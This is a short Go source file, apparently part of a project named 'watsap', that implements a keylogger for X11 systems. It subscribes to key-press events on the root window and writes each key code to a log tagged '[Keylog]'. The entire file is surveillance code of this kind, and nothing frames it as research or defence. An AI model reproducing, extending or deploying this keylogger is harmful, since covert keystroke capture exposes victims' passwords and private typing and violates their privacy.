//go:build !windows
// +build !windows

package keylog

import (
	"fmt"
	"watsap/utils/config"

	"github.com/BurntSushi/xgb"
	"github.com/BurntSushi/xgb/xproto"
)

func InitKeyboard() {
	conn, err := xgb.NewConn()
	if err != nil {
		config.Logger(fmt.Sprintf("[Keylog] Error opening X connection: %v", err), "error")
		return
	}
	defer conn.Close()

	setup := xproto.Setup(conn)
	root := setup.DefaultScreen(conn).Root

	err = xproto.ChangeWindowAttributesChecked(conn, root, xproto.CwEventMask, []uint32{xproto.EventMaskKeyPress}).Check()
	if err != nil {
		config.Logger(fmt.Sprintf("[Keylog] Error changing window attributes: %v", err), "error")
		return
	}

	for {
		ev, err := conn.WaitForEvent()
		if err != nil {
			config.Logger(fmt.Sprintf("[Keylog] Error waiting for event: %v", err), "error")
			return
		}

		switch e := ev.(type) {
		case xproto.KeyPressEvent:
			config.Logger(fmt.Sprintf("[Keylog] Key pressed: %v", e.Detail), "info")
		}
	}
}
